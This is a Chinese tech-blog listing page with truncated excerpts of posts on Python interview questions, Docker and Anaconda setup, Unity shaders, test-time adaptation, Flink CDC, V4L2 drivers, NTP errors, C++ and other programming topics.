额外的脉冲不仅用于喷射较大的液滴。通常在“关闭”数据上使用预脉冲使喷嘴挠痒，这意味着将提供足够的力以使墨水在喷嘴内移动，但不会喷射墨滴。另一个应用程序是使用后脉冲来消除弯液面的振荡，使您可以增加频率而不受先前下降的干扰。下面的波形具有许多内置的此类功能，并根据理光的台式打印机专利进行了改编。
06. 附录 参考：https://imagexpert.com/what-is-a-waveform/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/022dcb3cf3d4da417e35fe9f6a8d42f1/" rel="bookmark">
			25道Python经典面试题大全，看这一篇就够了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		吐血整理了一周的Python面试题，每道题都加上了详细的独家解析，高频考点都涉及到了，刷完这套题，希望你帮助你面试顺利~
涉及到垃圾回收机制、内存管理、迭代器生成器等高频考点。
1、什么是值传递、引用传递？
值传递是传递变量的值，不会改变函数外面变量的值。不可变对象（比如strings, tuples, 和numbers）用的是值传递。
引用传递是传递对象的地址，会改变对象本身的值，可变对象（比如list, dict, set）用的是引用传递。
2、什么是实参、形参？
形式传参：在定义函数时，函数名后面括号中的参数为“形式参数”，也称为形参。
实际参数：在调用函数时，函数名后面括号中的参数为“实际参数”，也称为实参。
def fun(a): # 这里的a是形参 a = 2a = 1fun(a) # 这里的a是实参 3、下面这个代码，最终输出的结果是多少？为什么？
a = 1def fun(a): a = 2fun(a)print a 答案：
输出结果是1，因为a = 1，是Number类型的对象。Number属于不可变对象，这样实参的值传给形参的时候，会使用值传递，只会用实参的值来初始化形参的存储单元，也就是说实参和形参会是两个不同的存储单元，所以函数里面进行的赋值操作，不会改变函数外面变量的值。
4、什么是元类？
所有对象都是实例化或者调用类而得到的，python中一切都是对象，通过class关键字定义的类本质也是对象，对象又是通过调用类得到的，因此通过class关键字定义的类肯定也是调用了一个类得到的，这个类就是元类。type就是Python内置的元类。
5、在python中，什么是构造函数？
在创建类时，我们可以手动添加一个 __init__() 方法，该方法是一个特殊的类实例方法，称为构造方法(或构造函数)。
构造方法用于创建对象时使用，每当创建一个类的实例对象时，Python 解释器都会自动调用它。
6、类变量和实例变量
类变量：是可以在类的所有实例之间共享的值（也就是说，它们不是单独分配给每个实例的）。例如下例中，num_of_instance 就是类变量，用于跟踪存在着多少个Test 的实例。
实例变量：实例化之后，每个实例单独拥有的变量。
7、讲讲Python的静态方法、类方法、实例方法
class A(object): # 实例方法 def foo(self,x): print "executing foo(%s,%s)"%(self,x) # 类方法 @classmethod def class_foo(cls,x): print "executing class_foo(%s,%s)"%(cls,x) # 静态方法 @staticmethod def static_foo(x): print "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/022dcb3cf3d4da417e35fe9f6a8d42f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0e285c82b4c756e889e41a4503c6c08/" rel="bookmark">
			Jupyter Notebook与Pycharm代码连接Docker容器中的远程服务器运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天终于有幸让大师兄给我安排了实验室的显卡，之前我学习深度学习的一段时间都是在Google Colab中跑的，并且之前一直都用的是Tensorflow+Keras框架，目前我刚学习完Pytorch，也寻思着再运行一下做过的图像分类和文本分类任务。本来用的是实验室分配的主机（笔记本带着太麻烦了，而且我笔记本用四年了，1050ti也不太行了），刚给新分配的主机装完CUDA+Pytorch（Windows 10配置安装PyTorch框架：https://www.yuque.com/zbdbc/fd87kk/ring8l），但是由于主机显卡比较老（GTX 750），数据跑的太慢了，我也不想像以前那样把代码全都上传到Google硬盘用Goole分配的服务器跑（早晚都要用到实验室的显卡），既然实验室有高级的显卡，不早早地拿来白嫖就可惜了，哈哈哈！！！本篇文章分成三部分：MobaXterm 简单介绍与使用、Docker容器中安装Anaconda、CUDA与Pyorch、配置Pycharm以及Jupyter连接远程服务器。
1.MobaXterm 简单介绍与使用 首先大师兄给我分配好的容器格式是这样的：ssh @xxx.vmip.com.cn -p （&lt;&gt; 中的内容根据实际书写 ），然后还有密码密码。起初拿到手我一脸懵，这以前我见到的Linux服务器都是给出的IP地址+密码，我刚开始不晓得该用哪个工具了（其实感觉当时我脑子进水了。。。。），我就在自己电脑打开cmd命令，尝试连了下，没想到还真给我连接上了。。。然后我突然就想到，以前连接Liunx服务器不都是用Xshell吗，然后我就很简单了，IP就是tt1.vmip.com.cn，选择SSH模式，端口号就是给我分配的端口，然后也连接上了。后来在查询如何配置Pycharm以及Jupyter连接远程服务器的过程中偶然接触到一个牛批的神器：MobaXterm！！！
为何说它牛批呐？去读这篇文章就知道了（含有下载地址）：https://mp.weixin.qq.com/s/p96kWPkPuJYeWxG3AqvnDQ，我总结下来就是Xshell能做到的，MobaXterm都能做到，做的还比Xshell更好，而且它的界面确实很舒适，最下方工具栏能够监视GPU和CPU的资源利用情况。同时可以直接将本地文件上传到服务器，或用本机编辑器直接编辑远程服务器端文件，不用再下载跟Xshell配套的Xftp。界面如下：
2.Docker容器安装Anaconda及Jupyter notebook远程连接服务器 俗话说，凡事踏出第一步很难，我准备看一下实验室的显卡是啥规格的，就想用nvidia-smi命令查看一下，结果发现没有这个命令，于是就依靠万能的百度，说需要装一下驱动。
我又确认一下我的容器环境是Ubuntu 20.04.3；对应实验室的显卡是：NVIDIA TiTan XP 显卡（12G），不过我看到一些文章说容器中是不需要额外安装驱动的，到这里我又是很懵。最后我自己理解是我这只是服务器中的一个容器，相当于服务器中的很小的一块地方，小家伙肯定没法查看巨兽内部的状态。在网上搜寻的Docker教程第一步都是在服务器中安装docker和创建基础容器创建容器等那些复杂的工作，大师兄已经帮我做好了，直接把创建好的容器交给了我，因此我只需要老老实实的安装一下Anaconda等就可以，没搞懂之前暂时先别安装驱动！等后面用到再说。。。。
还有个Bug就是刚分配的容器连Sudo命令都没有，一些sudo命令会报错：-bash: sudo: command not found，查看这篇文章：https://www.cnblogs.com/pengpengboshi/p/16159443.html。
另外遇到一个坑：有博客让我编辑配置文件时用 gedit命令，然而我Ubuntu系统是没有的，得去安装，结果一安装就是一个多小时（心态炸了），最后确实安装好了，不过还是不能用，看到别的博客说必须图形化界面才能用，最后我突然想到编辑文件还可以用vim命令。。（脑子不好使了）
安装Anaconda 具体Docker容器中Ubuntu下安装Anaconda如下：
1.首先去清华源下载想要的版本：https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/；我选择Anaconda3-5.3.1-Linux-x86_64.sh，听说最稳定。。。
2.安装。可以将之前下载的.sh文件通过MobaXterm终端从本机上传到容器中， 在文件下载的目录下打开终端，运行.sh文件： bash Anaconda3-5.3.1-Linux-x86_64.sh。 安装过程中会出现阅读条款，然后回车直到出现yes or no的选择，输入yes 回车继续安装。 一直回车，不要按太快，会出现可以修改安装路径，最后我的安装位置是/home/PythonTools/Anaconda/anaconda3/。
**3.设置Anaconda环境变量。**如果在安装Anaconda的过程中没有将安装路径添加到系统环境变量中，需要在安装后手工添加。
首先在终端输入：sudo vim /etc/profile ，打开profile文件。
然后在文件末尾添加一行：export PATH="/home/PythonTools/Anaconda/anaconda3/bin:$PATH"。（将 “/home/PythonTools/Anaconda/anaconda3/” 替换为你实际的安装路径并保存。）
接着输入命令 source /etc/profile ，使/etc/profile文件修改后立即生效。
**4.重启Linux。**打开终端，输入conda --version，查看是否安装成功。可以在终端中输入 echo $PATH 查看已有的环境变量，确认输出里是否已有Anaconda路径了。
Jupyter Notebook连接远程服务器 启动Jupyter notebook时，遇到了Bug：OSError: [Errno 99] Cannot assign requested address。我认为是没有安装的缘故，于是就pip install一下（已经配置清华源）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0e285c82b4c756e889e41a4503c6c08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8466212235be20be8e52ae12bd0d3379/" rel="bookmark">
			unity关于纹理、着色器和材质的介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图形资源可以分解为纹理、着色器和材质。纹理和着色器应用于材质，然后把材质应用于模型。
纹理（Texture）：应用于3D对象的平面图像，使模型变得色彩斑斓，而不是只有形状。 创建一个复杂模型时，常用展开（unwrap）类似贴图，准确显示平面纹理如果包装在模型周围。我们来看一个汤罐头。如果你取下罐头的标签，就会看到它是一张平面的纸。这个标签就像是纹理。
纹理检视面板（Texture Inspector）窗口：配置各种纹理类型的属性。根据不同的需要可以选择不同的纹理类型，具体选择见：https://docs.unity.cn/cn/2019.4/Manual/TextureTypes.html
着色器（Shader）：决定在模型表面如何绘制纹理。假设你有一块木头。木头的物理性是它的网格。颜色、质地和可见的元素就是它的纹理。现在拿起木头，往上浇一些水。木头的网格还是原来的网格，它还是由原来的材料（木头）组成，但是看上去有些不同。它稍微暗了一点并且富有光泽。这个例子中有两个“着色器”：干木头和湿木头。湿木头“着色器”添加了一些东西，让它看起来有些不同，但实际上并没有改变它。
材质（Materials）：应用于模型的着色器和纹理的容器，大部分工作是选择着色器，材质的着色器在计算模型的表面颜色时使用纹理。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8781da1a816a906bda72dd381204e7e2/" rel="bookmark">
			测试阶段模型自适应方法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		©PaperWeekly 原创 · 作者 | 张一帆
单位 | 中科院自动化所博士生
研究方向 | 计算机视觉
Domain Generalization（DG：域泛化）一直以来都是各大顶会的热门研究方向。DA 假设我们有多个个带标签的训练集（源域），这时候我们想让模型在另一个数据集上同样表现很好（目标域），但是在训练过程中根本不知道目标域是什么，这个时候如何提升模型泛化性呢？核心在于如何利用多个源域带来的丰富信息。
DG 最困难的地方在于 test-sample 的不可知，训练时不可用，近期有一系列方法开始尝试假设 test sample 以 online 的形式出现，然后利用其信息增强泛化性，下表总结了 test time daptation 方法与传统 DA，DG 方法的区别。
传统 DG 方法就是在源域 finetune 预训练模型，然后部署时不经过任何调整。DA 方法可以根据无标签的目标域数据在训练时调整模型，test-time training 方法在测试时会有一些无监督损失比如检测旋转角度等，然后对每个 test sample 也会进行旋转角度的检测，本文所述的 fully test-time adaptation 在 training 的时候不需要无监督损失，而只需要在 test 的时候进行 adaptation。
T3A
论文标题：
Test-Time Classifier Adjustment Module for Model-Agnostic Domain Generalization
论文来源：
NeurIPS 2021 Spotlight
论文链接：
https://proceedings.neurips.cc/paper/2021/hash/1415fe9fea0fa1e45dddcff5682239a0-Abstract.html
代码链接：
https://github.com/matsuolab/T3A
以往的 DG 方法都致力于研究如何利用好手头的域信息，这篇文章另辟蹊径。在 test 的阶段，我们在依然会选择更新模型头部的linear层。但是这与直接使用 test 的数据进行训练不同，主要的差异在于，本文假设在测试时，模型通常部署在某些环境中，并且必须在不断出现的各种示例上工作良好，样本连续到来是本文场景的主要特征，在拿到样本后模型需要立刻给出决策并更新。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8781da1a816a906bda72dd381204e7e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/802ae4a3db3c09d1539e5d56ae0953dc/" rel="bookmark">
			洛谷：P1462 通往奥格瑞玛的道路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目连接：P1462 通往奥格瑞玛的道路 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)
题目要求是假如有多条路线，求出每条路线的最大值然后选出其中的最小值。
一般这种问法都是二分。
对于单次最大收费小于等于x的情形如果存在方案，那么大于x的也存在方案，因为费用越大所能走的路就越多。显然可以用二分。
然后有两个变量血量以及费用我们以谁为二分的分界点呢？？
首先我们可以看到题目输入的边是血量，所以我们可以以经过一条路的血量总和check(mid)不超过题目输入的blood为分界点。若check(mid) &lt;= blood则扩大费用即r = mid,否则缩小费用l = mid + 1;
然后我们确定一下二分的起始点，因为起点和终点是包括费用的，所以费用的最小值为起点和终点中的最大值，而费用的最大值即为每个点费用的最大值
#include &lt;queue&gt; #include &lt;cstdio&gt; #include &lt;cstring&gt; #include &lt;iostream&gt; #define x first #define y second using namespace std; typedef pair&lt;long, int&gt; PLI;//会爆int const int N = 10010, M = 1000010; int l, r; bool st[N]; int fees[N]; int n, m, blood; long long dist[N]; int h[N], e[M], ne[M], w[M], idx; void add(int a, int b, int c)//邻接表 { e[idx] = b; w[idx] = c; ne[idx] = h[a]; h[a] = idx; idx ++ ; } int check(int maxd)//dijkstra模板 { memset(st, 0, sizeof st); memset(dist, 0x3f, sizeof dist); priority_queue&lt;PLI, vector&lt;PLI&gt;, greater&lt;PLI&gt;&gt; heap; dist[1] = 0; heap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/802ae4a3db3c09d1539e5d56ae0953dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49f95f23c6924d76ad5a6b23c7aa7e68/" rel="bookmark">
			Flink CDC问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里会列举出一些关键配置和遇到的问题，一直补充......
Oracle CDC 1. SUPPLEMENTAL LOG在库和表上都需要执行，不是只有表上
ALTER TABLE inventory.customers ADD SUPPLEMENTAL LOG DATA (ALL) COLUMNS;
ALTER DATABASE ADD SUPPLEMENTAL LOG DATA;
2. 报错：Caused by: io.debezium.DebeziumException: Supplemental logging not configured for table xxx. Use command: ALTER TABLE xxx ADD SUPPLEMENTAL LOG DATA (ALL) COLUMNS
解答：第一检查oracle表是否已经执行命令 ALTER TABLE xxx ADD SUPPLEMENTAL LOG DATA (ALL) COLUMNS，假如已经执行了，但是还是报错，那就不是oracle这边的问题。对于 oracle11 版本，debezium 会默认把 tableIdCaseInsensitive 设置为true, 导致表名被更新为小写，因此在oracle中查询不到 这个表补全日志设置，导致误报这个Supplemental logging not configured for table 错误”。 添加 debezium 的配置项 'database.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49f95f23c6924d76ad5a6b23c7aa7e68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00fcd2cec527ddbd43b29545bdab19cc/" rel="bookmark">
			Camera V4L2框架的驱动层分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.V4L2 框架
v4l2驱动框架主要的对象有video_device、v4l2_device、v4l2_subdev、videobuf。
video_device：
一个字符设备，为用户空间提供设备节点(/dev/videox)，提供系统调用的相关操作(open、ioctl…)
v4l2_device：
嵌入到video_device中，表示一个v4l2设备的实例
v4l2_subdev：
依附在v4l2_device之下，并表示一个v4l2设备的子设备，一个v4l2_devide下可以有多个sub_device
videobuf：
v4l2驱动的缓存管理
在V4L2驱动中，使用v4l2_device来表示摄像头控制器
使用v4l2_subdev来表示具体的某一个摄像头的I2C控制模块，进而通过其控制摄像头
v4l2_device里有一个v4l2_subdev链表，可以选择v4l2_device去控制哪一个v4l2_subdev。
video_device是一个字符设备，从图中可以看出，video_device内含一个cdev
v4l2_device是一个v4l2实例，嵌入到video_device中
v4l2_device维护者一个链表管理v4l2_subdev，v4l2_subdev表示摄像头的I2C控制模块。
核心层负责注册字符设备，然后提供video_device对象和相应的注册接口给硬件相关层使用
硬件相关层需要分配一个video_device并设置它，然后向核心层注册，核心层会为其注册字符设备
并且创建设备节点(/dev/videox)。同时硬件相关层还需要分配和设置相应的v4l2_device和
v4l2_subdev，其中v4l2_device的一个比较重要的意义就是管理v4l2_subdev，当然有一些驱动并
不需要实现v4l2_subdev，此时v4l2_device的意义就不是很大了。
当应用层通过/dev/video来操作设备的时候，首先会来到V4L2的核心层，核心层通过注册进的
video_device的回调函数调用相应的操作函数，video_device可以直接操作硬件或者是通过
v4l2_subdev来操作硬件。
2.V4L2提供的注册接口
video_device
注册：
int video_register_device(struct video_device *vdev, int type, int nr); 注销：
void video_unregister_device(struct video_device *vdev); v4l2_device
注册：
int v4l2_device_register(struct device *dev, struct v4l2_device *v4l2_dev); 注销：
void v4l2_device_unregister(struct v4l2_device *v4l2_dev); v4l2_subdev
注册：
int v4l2_device_register_subdev(struct v4l2_device *v4l2_dev, struct v4l2_subdev *sd); 注销：
void v4l2_device_unregister_subdev(struct v4l2_subdev *sd); 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00fcd2cec527ddbd43b29545bdab19cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f266343feaf3237f639b773d82b17f0/" rel="bookmark">
			神经网络与深度学习 作业1：第二章课后题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 习题 2-1 分析为什么平方损失函数不适用于分类问题 , 交叉熵损失函数不适用于回归问题.
平方损失函数:
使用平方损失函数处理分类问题时，由于分类问题的结果是离散值,分类正确的项之间以及分类错误的项之间误差都是一样的，不具有距离的意义，通过计算平方得到的误差大小实际上并不能很好地反映误差大小，且分类问题的函数不是凸函数，会陷入局部最小点，会对优化造成困难。
平方损失函数:
交叉熵损失函数之和分类正确的预测结果有关，但回归问题除了要让正确的分类尽量变大，还要让错误的分类变得平均。因此回归问题不适合使用 交叉熵损失函数。
习题 2-12 对于一个三分类问题 ， 数据集的真实标签和模型的预测标签如下 ：
分别计算模型的精确率、召回率、F1值以及它们的宏平均和微平均． 预测结果正例反例真实情况正例TP（真正例）FN（假反例）反例FP（假正例）TN（真反例） 精准率（查准率）： 召回率（查全率）： F值（精准率和召回率的调和平均）： 宏平均（每一类性能指标的算术平均）:
宏查准率： 宏查全率： F1: 微平均（每个样本的性能指标的算术平均值）:
参考内容： 平方损失函数与交叉熵损失函数_m_buddy的博客-CSDN博客_平方损失函数 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c5ba509d40505021ed348dd731aac77/" rel="bookmark">
			C&#43;&#43; —— IO流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 流的定义2. c++的IO流2.1 &lt; iostream &gt;2.2 &lt; fstream &gt;2.2.1 C语言的文件IO2.2.2 C++的文件IO2.2.2.1学习俩个类2.2.2.2 使用C++的文件IO 2.3 &lt; sstream &gt; 前言: 我们学习语言时，第一个程序可能就是输出hollow world。但是怎么输出到屏幕上的呢？这原理是怎样的呢？本文就来详细的解析此原理。 1. 流的定义 C++流是指信息从外部输入设备（如键盘）向计算机内部（如内存）输入和从内存向外部输出设备（显示器）输出的过程。这种输入输出的过程被形象的比喻为“流”。
它的特性是：有序连续、具有方向性
为了实现这种流动，C++定义了I/O标准类库，这些每个类都称为流/流类，用以完成某方面的功能
2. c++的IO流 c++实现了庞大的类库，&lt; ios &gt;为基类，其余的都是派生类或间接派生类。
2.1 &lt; iostream &gt; 这是我们常包的头文件，里面有cin，cout，cerr，clog。
cin：进行标准输入，数据从键盘上输入到程序中cout：进行标准输出，数据从内存输出到显示器上cerr：进行标准错误输出clog：进行日志输出 cin，cout支持多种类型的输入输出，本质因为其重载了操作符&lt;&lt;和&lt;&lt;，我们可以以cout为例，查看一下：
就是函数重载，使得其如此的方便，比C语言还优化在哪里呢？那就是我们可以重载&lt;&lt;,&gt;&gt;。完成自定义类型的输入输出。
比如：
我定义一个日期类，并且重载&lt;&lt;,&gt;&gt;。
#include&lt;iostream&gt; using namespace std; class Date { friend ostream&amp; operator&lt;&lt;(ostream&amp; ofs, Date&amp; d); friend istream&amp; operator&gt;&gt;(istream&amp; i, Date&amp; d); public: Date(int year = 2022, int month = 1, int day = 1) :_year(year) , _month(month) , _day(day) {} private: int _year; int _month; int _day; }; ostream&amp; operator&lt;&lt;(ostream&amp; o, Date&amp; d) { o &lt;&lt; d.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c5ba509d40505021ed348dd731aac77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57aadec138cdcbfa29ffd24fe9d44f81/" rel="bookmark">
			numba使用踩坑总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于没有完全理解numba就直接使用了，所以犯了一些使用时的错误。
尽量使用numpy的数据类型来写代码，numba对numpy的支持最好；但是并不是所有的numpy函数都被支持，比如我用到的np.clip, np.pad等函数都不支持，通过下面网址查看到底支持哪些numpy函数：http://numba.pydata.org/numba-doc/latest/reference/numpysupported.html。 遇到无法支持的函数时，两个选择，一个是重新手写该函数；另一个则是选择不在jit加速范围内调用该函数。np.zeros(shape, type)函数的调用中犯了一个错误，平时习惯性地会使用一个list作为shape参数，如[10, 10]，平时正常使用numpy的时候也没问题，但是使用numba加速时却遇到了编译问题：Compilation is falling back to object mode WITHOUT looplifting enabled because Function "xxx" failed type inference due to: Invalid use of type(CPUDispatcher(&lt;function xxx at 0x000001B6981D4708&gt;)) with parameters (int64, int64, int64, array(float64, 4d, C)) During: resolving callee type: type(CPUDispatcher(&lt;function xxx at 0x000001B6981D4708&gt;)) numba的编译告警确实有点不太直观，从告警上很难定位到具体的问题出在哪儿，而且往往一个问题会引发出多处的告警。具体在定位的时候我喜欢用简化排除法，构造很简单的例子来排除问题，比如先把函数体变成空的，然后一点点加上内容，看问题到底出在哪里。再来看一个类似的例子：https://github.com/numba/numba/issues/4650
在numba的官方那里的一个issue，跟我上面的报错很类似。from numba import njit import numpy as np @njit def _get_most_similar(query_ftrs: np.ndarray, all_images_ftrs: np.ndarray) -&gt; np.ndarray: products = np.empty(all_images_ftrs.shape[0], dtype=query_ftrs.dtype) for i in range(len(all_images_ftrs)): ftrs = all_images_ftrs[i] products[i] = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57aadec138cdcbfa29ffd24fe9d44f81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e5f9123248c0e9aa53330ffad5167a0/" rel="bookmark">
			[linux][报错][ntp]NTP同步常见报错之no server suitable for synchrnization found
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： 环境centos7.9
问题描述 设置一台服务器为ntp 服务端。另一台为客户端。发现报错。no server suitable for synchrnization found
使用：ntpdate -d 10.143.33.50
查看报错
xxx.xxx.xxx.xxx: Server dropped: no data
调试过程中又出现
xxx.xxx.xxx.xxx：server dropped ：strata too high
原因分析： 1、服务器上本来安装了keepalived。以为是因为这个影响。关闭后发现问题还在。
2、--从服务器端检查
[root@timeserver ~]# ntpq -p
remote refid st t when poll reach delay offset jitter
==============================================================================
210.72.145.44 .ACTS. 1 u 971 8 0 0.000 0.000 0.000
202.120.2.101 .INIT. 10 u 8 64 377 0.000 0.000 0.000
查看是正常的。
3、有可能是网络原因
4、从资料看和conf.配置也有关系，如restrict等配置
解决方案： 1、确保123端口是联通的
2、修改服务端配置 （202.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e5f9123248c0e9aa53330ffad5167a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c5c2de8f61c2f6c400c18c8cbcccb6c/" rel="bookmark">
			Person相关分析原理以及python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.总体Person相关系数2. 样本Person相关系数3. 相关系数误区4. Person总结5. 相关系数的假设检验5. Python实现5.1 程序5.2 数据 总体——所要考察对象的全部个体叫做望得到总体数据的一些特征（例如均值方差等） 样本——从总体中所抽取的一部分个体叫做总体的一个样本 1.总体Person相关系数 如果两组数据 X : { X 1 , X 2 , ⋯ , X n } X:\left\{X_{1}, X_{2}, \cdots, X_{n}\right\} X:{X1​,X2​,⋯,Xn​} 和 Y : { Y 1 , Y 2 , ⋯ , Y n } Y:\left\{Y_{1}, Y_{2}, \cdots, Y_{n}\right\} Y:{Y1​,Y2​,⋯,Yn​} 是总体数据
那么总体均值： E ( X ) = ∑ i = 1 n X i n , E ( Y ) = ∑ i = 1 n Y i n E(X)=\frac{\sum_{i=1}^{n} X_{i}}{n}, E(Y)=\frac{\sum_{i=1}^{n} Y_{i}}{n} E(X)=n∑i=1n​Xi​​,E(Y)=n∑i=1n​Yi​​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c5c2de8f61c2f6c400c18c8cbcccb6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/583a4ad9026cac464373f3e6748807f5/" rel="bookmark">
			C&#43;&#43;中运算符重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 一、运算符重载1.1、友元重载1.2 类重载 二、特殊的运算符重载总结 一、运算符重载 a、什么是运算符重载？
定义：运算重载是赋予自定义数据能被运算符直接操作，运算符重载实质是函数调用。
如：+运算符，一般情况下只能运算两个int | float | double 的数据，但如果我们将两个字符串加在一起，就需要对+运算符进行重载。
注意：一般我们将两个字符串相加只需要包含#include头文件即可，这里头文件中已经为我们封装好了+运算符重载。
b、运算符重载中的一些名词
函数返回值类型： 这个运算符最终运算符结果的类型 MM a MM b MM c=a+b c 就是为MM
函数名: operator加上运算符组成函数名 operator+ 这个整体函数名
函数参数: 看运算符需要几个参数去运算，传几个参数
友元重载: 参数个数是等于操作数类重载： 参数个数是等于操作数-1 参数类型： 操作数的类型决定
函数体： 写你想要的运算(不能违背运算符本来含义)
c、运算符重载的一般格式
一般函数重载格式：函数返回值类型 + 函数名 (函数参数) { 函数体 }
友元函数重载格式：friend + 函数返回值类型 + 函数名 (函数参数) { 函数体 }
例如：//友元重载 girl + mm
friend MM operator+(MM&amp; object1, MM&amp; object2);
d、运算符重载的显隐式调用
一般使用的是隐式调用，但代码底层还是将其解析为显式调用格式，再去调用。
例如：重载了MM类中的+运算符
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/583a4ad9026cac464373f3e6748807f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5f23ac31fb763eb4dbddc4147c97bf0/" rel="bookmark">
			django动态创建模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		应用场景，对于数据分表查询的时候，非常有用，比如历史某些数据比较大，每个月一个表，这就需要用到动态加载表。 # -*- coding: utf-8 -*- from django.contrib import admin from django.db import models def create_model(model_name, app_label='', fields=None, module='', meta_options=None, admin_options=None): """ Create specified model """ class Meta: # Using type('Meta', ...) gives a dictproxy error during model creation pass if app_label: # app_label must be set using the Meta inner class setattr(Meta, 'app_label', app_label) # Update Meta with any options that were provided if meta_options is not None: for key, value in meta_options.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5f23ac31fb763eb4dbddc4147c97bf0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f3fe75c5a2f26e3d7681cdc0fb1c5b7/" rel="bookmark">
			小程序获取用户手机号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过获取用户手机号，可以省去很多操作，是比较常见的功能。
获取用户手机号码 分为以下几步：
第一点击页面获取授权按钮
第二获取用户授权参数
第三根据加解密算法解密手机号码
需要将 button 组件 open-type 的值设置为 getPhoneNumber，当用户点击并同意之后，可以通过 bindgetphonenumber 事件回调获取到微信服务器返回的加密数据， 然后在第三方服务端结合 session_key 以及 app_id 进行解密获取手机号。
&lt;button open-type="getPhoneNumber" bindgetphonenumber="getPhoneNumber"&gt;&lt;/button&gt; getPhoneNumber是微信官方要求，获取用户手机号码授权
onGetPhoneNumber是回调函数，获取授权后会回调到该方法，也就是获取的电话号码就在这个函数的返回值里面。当然这个函数是自定义的，名字大家可以随便起，上面的getPhoneNumber可不能随便修改。
onGetPhoneNumber(e) { var that = this; wx.login({ success (res) { if (res.code) { console.log('步骤2获检查用户登录状态，获取用户电话号码！', res) wx.request({ url: '这里写自己的接口', data: {code: res.code}, success: function(res) { console.log("步骤三获取授权码，获取授权openid，session_key",res); var userphone=res.data.data; wx.setStorageSync('userphoneKey',userphone); //解密手机号 var msg = e.detail.errMsg; var sessionID=wx.getStorageSync("userphoneKey").session_key; var encryptedData=e.detail.encryptedData; var iv=e.detail.iv; if (msg == 'getPhoneNumber:ok') {//这里表示获取授权成功 wx.checkSession({ success:function(){ //这里进行请求服务端解密手机号 that.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f3fe75c5a2f26e3d7681cdc0fb1c5b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b7e5b2f98377682bff8c45468d29e98/" rel="bookmark">
			关闭Windows系统的应用程序或窗口的快捷键有哪些？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
